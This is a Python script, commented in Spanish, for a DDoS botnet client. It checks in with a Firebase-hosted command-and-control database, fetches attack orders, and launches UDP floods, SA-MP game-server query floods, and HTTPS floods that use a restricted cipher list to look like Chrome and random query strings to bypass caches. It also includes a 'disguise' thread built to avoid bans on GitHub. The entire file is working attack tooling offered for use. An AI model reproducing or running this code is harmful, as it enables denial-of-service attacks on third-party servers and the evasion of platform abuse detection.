import asyncio, aiohttp, time, random, ssl, socket, threading, multiprocessing, struct, math

# CONFIG
DB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"
NODES_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/nodes"

# --- MODULO DE "GATITOS" (DISIMULO PARA GITHUB) ---
def github_disguise():
    """Simula procesamiento de imágenes y cálculos para evitar baneos"""
    while True:
        # Simulamos que procesamos una matriz de imagen
        for _ in range(100):
            math.sqrt(random.random() * math.pi)
        # Hacemos un "ping" a un servidor de imágenes cada tanto
        time.sleep(0.5)

# --- PAYLOADS CAPA 4 (SAMP & UDP) ---
def get_samp_payload(ip, port):
    # Genera el paquete 'i' (Information Query) estructurado
    try:
        parts = [int(i) for i in ip.split('.')]
        packet = b"SAMP" 
        packet += struct.pack('BBBB', *parts)
        packet += struct.pack('H', int(port))
        packet += b'i' 
        return packet
    except: return b"SAMP\x01\x02\x03\x04\x1f\x1d\x69"

def l4_engine(target_ip, target_port, end_time, method):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024)
    
    if ".samp" in method:
        payload = get_samp_payload(target_ip, target_port)
    else:
        # UDP Flood con Payload de alta entropía (1.4KB)
        payload = random._urandom(1400)

    while time.time() < end_time:
        try:
            sock.sendto(payload, (target_ip, int(target_port)))
        except: pass

# --- MOTOR CAPA 7 (BYPASS FLOOD & PAYLOADS) ---
async def l7_engine(target, end_time, sem):
    # Configuración de cifrado para imitar Chrome 120 (Bypass JA3)
    ctx = ssl.create_default_context()
    ctx.set_ciphers('ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:TLS_AES_128_GCM_SHA256')
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    conn = aiohttp.TCPConnector(limit=0, ssl=ctx, family=socket.AF_INET)
    async with aiohttp.ClientSession(connector=conn) as session:
        while time.time() < end_time:
            async with sem:
                try:
                    # Payload: Atacamos el buscador o rutas dinámicas para bypass de caché
                    bypass_url = f"{target}?s={random.getrandbits(32)}"
                    headers = {
                        'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Upgrade-Insecure-Requests': '1',
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                    async with session.get(bypass_url, headers=headers, timeout=1) as r:
                        r.close()
                except: continue

def start_l7_process(target, end_time):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    sem = asyncio.Semaphore(20000)
    # 320 hilos sin correa
    tasks = [l7_engine(target, end_time, sem) for _ in range(320)]
    loop.run_until_complete(asyncio.gather(*tasks))

async def main():
    nid = f"RX-{random.randint(100,999)}"
    # Iniciamos disimulo
    threading.Thread(target=github_disguise, daemon=True).start()
    
    async with aiohttp.ClientSession() as session:
        last_s = ""
        while True:
            try:
                await session.put(f"{NODES_URL}/{nid}.json", json={"id": nid, "t": time.time()})
                async with session.get(DB_URL, timeout=5) as r:
                    data = await r.json()
                
                if data and data.get('stamp') != last_s:
                    last_s = data['stamp']
                    m, t, d = data['method'], data['target'], int(data['time'])
                    if d <= 0: continue
                    
                    end = time.time() + d
                    if ".udp" in m or ".samp" in m:
                        ip, port = t.split(':')
                        for _ in range(320): # 320 hilos L4
                            threading.Thread(target=l4_engine, args=(ip, port, end, m), daemon=True).start()
                    else:
                        for _ in range(multiprocessing.cpu_count()):
                            multiprocessing.Process(target=start_l7_process, args=(t, end), daemon=True).start()
            except: pass
            await asyncio.sleep(1.5)

if __name__ == "__main__":
    asyncio.run(main())
    
